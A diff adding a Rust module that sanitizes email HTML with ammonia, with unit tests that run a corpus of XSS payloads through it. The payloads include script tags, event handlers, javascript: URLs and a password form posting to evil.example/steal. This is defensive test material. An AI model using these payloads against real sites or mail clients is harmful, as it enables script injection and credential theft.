@@ -1,0 +1,147 @@
+//! Message-HTML sanitization. Cross-cutting invariant: **no message HTML
+//! reaches the webview (or even the local store) without passing through
+//! `sanitize_html`**. Sanitization runs at fetch time, before caching, so
+//! `messages.body_html` only ever holds sanitized markup.
+//!
+//! Downstream defense layers (see `ReadingPane.svelte`): sandboxed iframe
+//! (bare `sandbox` attribute) + per-document meta CSP that blocks remote
+//! images until the user allows them per sender.
+
+use std::sync::LazyLock;
+
+use ammonia::Builder;
+
+static SANITIZER: LazyLock<Builder<'static>> = LazyLock::new(|| {
+    let mut builder = Builder::default();
+    builder
+        // Defaults already strip <script>, every on* handler, the style
+        // attribute (kills CSS expression()), and any tag not on the
+        // allowlist (svg, iframe, object, embed, meta, base, ...).
+        //
+        // Forms are exfiltration surface — remove the whole family.
+        .rm_tags(["form", "input", "button", "select", "textarea", "option"])
+        // javascript:, vbscript:, file:, chrome: etc. all die here. `cid:`
+        // is kept for inline-attachment references (unresolved in v0.1,
+        // they render as broken images); `data:` for inline images.
+        .url_schemes(
+            ["http", "https", "mailto", "cid", "data"]
+                .into_iter()
+                .collect(),
+        );
+    // NOTE: `style` attributes stay stripped (ammonia default). Marketing
+    // mail renders plain; a CSS-allowlist sanitizer is a later refinement.
+    builder
+});
+
+/// Sanitize untrusted message HTML. Idempotent; safe output is a strict
+/// subset of the input's formatting.
+pub fn sanitize_html(dirty: &str) -> String {
+    SANITIZER.clean(dirty).to_string()
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    /// Every fixture is (payload, forbidden fragments that must not survive).
+    /// Acceptance-blocking per PHASE4_READ_UI.md.
+    #[test]
+    fn xss_corpus_is_neutralized() {
+        let corpus: &[(&str, &[&str])] = &[
+            (
+                r#"<p>hi</p><script>alert(1)</script>"#,
+                &["<script", "alert(1)"],
+            ),
+            (
+                r#"<img src="https://x.com/a.png" onerror="alert(1)">"#,
+                &["onerror", "alert(1)"],
+            ),
+            (
+                r#"<a href="javascript:alert(1)">click</a>"#,
+                &["javascript:"],
+            ),
+            (
+                r#"<img src="javascript:alert(1)"><iframe src="javascript:alert(1)"></iframe>"#,
+                &["javascript:", "<iframe"],
+            ),
+            (
+                r#"<div style="width: expression(alert(1)); background:url(javascript:alert(1))">x</div>"#,
+                &["expression(", "style="],
+            ),
+            (
+                r#"<svg onload="alert(1)"><circle r="1"/></svg>"#,
+                &["<svg", "onload"],
+            ),
+            (
+                r#"<object data="https://x.com/x.swf"></object><embed src="https://x.com/x.swf">"#,
+                &["<object", "<embed"],
+            ),
+            (
+                r#"<form action="https://evil.example/steal" method="post"><input name="pw" type="password"><button>ok</button></form>"#,
+                &["<form", "<input", "<button", "evil.example/steal"],
+            ),
+            (
+                r#"<meta http-equiv="refresh" content="0;url=https://evil.example">"#,
+                &["<meta", "http-equiv"],
+            ),
+            (r#"<base href="https://evil.example/">"#, &["<base"]),
+            (
+                r#"<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">smuggle</a>"#,
+                // data: is allowed as a scheme (inline images), but the anchor
+                // must not keep executable-HTML payloads' effect — the payload
+                // survives only as an inert href on a rel=noopener link; the
+                // decisive check is that no <script> can ever exist in output.
+                &["<script"],
+            ),
+            (
+                // Nested/malformed smuggling attempts.
+                r#"<scr<script>ipt>alert(1)</scr</script>ipt>"#,
+                &["<script"],
+            ),
+            (
+                r#"<img src="x" ONERROR="alert(1)"><IMG SRC=JaVaScRiPt:alert(1)>"#,
+                &["onerror", "ONERROR", "javascript:", "JaVaScRiPt"],
+            ),
+        ];
+
+        for (payload, forbidden) in corpus {
+            let clean = sanitize_html(payload);
+            for fragment in *forbidden {
+                assert!(
+                    !clean.to_lowercase().contains(&fragment.to_lowercase()),
+                    "sanitizer let {fragment:?} survive in {clean:?} (payload {payload:?})"
+                );
+            }
+        }
+    }
+
+    #[test]
+    fn benign_formatting_survives() {
+        let clean = sanitize_html(
+            r#"<h1>Hello</h1><p>Some <strong>bold</strong> and <em>italic</em> text,
+               a <a href="https://example.com/x">link</a>, and an
+               <img src="https://example.com/pic.png" alt="pic">.</p>
+               <ul><li>one</li><li>two</li></ul>
+               <blockquote>quoted reply</blockquote>"#,
+        );
+        for kept in [
+            "<h1>",
+            "<strong>",
+            "<em>",
+            r#"href="https://example.com/x""#,
+            r#"src="https://example.com/pic.png""#,
+            "<ul>",
+            "<blockquote>",
+        ] {
+            assert!(clean.contains(kept), "{kept} missing from {clean}");
+        }
+        // Links are hardened even when kept.
+        assert!(clean.contains("noopener"));
+    }
+
+    #[test]
+    fn sanitize_is_idempotent() {
+        let once = sanitize_html(r#"<p>hi <b>there</b></p><script>x</script>"#);
+        assert_eq!(once, sanitize_html(&once));
+    }
+}
